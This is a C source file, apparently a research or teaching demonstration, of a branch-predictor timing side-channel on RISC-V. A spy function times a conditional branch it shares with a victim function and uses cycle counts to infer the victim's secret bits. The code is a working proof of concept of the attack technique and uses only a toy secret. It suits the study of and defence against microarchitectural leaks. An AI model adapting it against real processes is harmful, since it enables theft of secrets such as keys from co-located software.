/*/////////////////////////////////////////////////////////////////////////////////
 * Name: Branch Direct Attack - a
 * Author: Rutvik Chavda
 * Description: This code demonstrates a timing attack scenario where a spy
 *              function and a victim function share the same conditional branch.
 *              The victim function accesses secret data, causing a branch to be
 *              taken. The spy function then times its own execution of the same
 *              branch to infer the secret data based on the cycle count.
 * License: GPL v3 - https://www.gnu.org/licenses/gpl-3.0.html
 *
 * Note: The `rdcycle()` function is a wrapper that calls an assembly instruction
 *       to retrieve the current cycle count from the processor. This is specific
 *       to the RISC-V architecture.
/////////////////////////////////////////////////////////////////////////////////*/

#include <stdio.h>
#include <stdint.h>
#include "encoding.h" // Include for `rdcycle()` function

#define K 10
#define J 2
#define SECRET_DATA_SIZE 8

unsigned int diff_values[K][SECRET_DATA_SIZE] = {};
unsigned int start, diff;

void condBranch(unsigned int *addr) {
    if (*addr) {
        __asm__ __volatile__("nop\n"
                             "nop\n");
    } else {
        __asm__ __volatile__("addi t1, zero, 2\n");
    }
}

void victimFunc(unsigned int idx) {
    unsigned int secret_data[SECRET_DATA_SIZE] = {1, 0, 0, 1, 1, 0, 1, 0}; // Secret data
    condBranch(&secret_data[idx]);
}

void spyFunc(unsigned int idx, int k, int i) {
    unsigned int array1[1] = {1}; // Dummy array for timing
    start = rdcycle();
    condBranch(&array1[idx]);
    diff = rdcycle() - start;
    diff_values[k][i] = diff;
}

int main(void) {
    for (int i = 0; i < SECRET_DATA_SIZE; i++) {
        for (int k = 0; k < K; k++) {
            // Train the victim function
            for (int j = 0; j < J; j++) {
                victimFunc(i);
            }
            // Spy function attempts to measure timing and infer secret data
            spyFunc(0, k, i);
        }
    }

    // Analyzing the gathered timing data
    printf("\nLower cycle count values coincide with the dummy value (1) in the spy array.\n");
    for (int i = 0; i < SECRET_DATA_SIZE; i++) {
        printf("Index: %d, Cycle count: ", i+1);
        for (int k = 0; k < K; k++) {
            // Filter out abnormally high values due to background kernel tasks
            if (diff_values[k][i] < 200) {
                printf("%u ", diff_values[k][i]);
            }
        }
        printf("\n");
    }
    return 0;
}
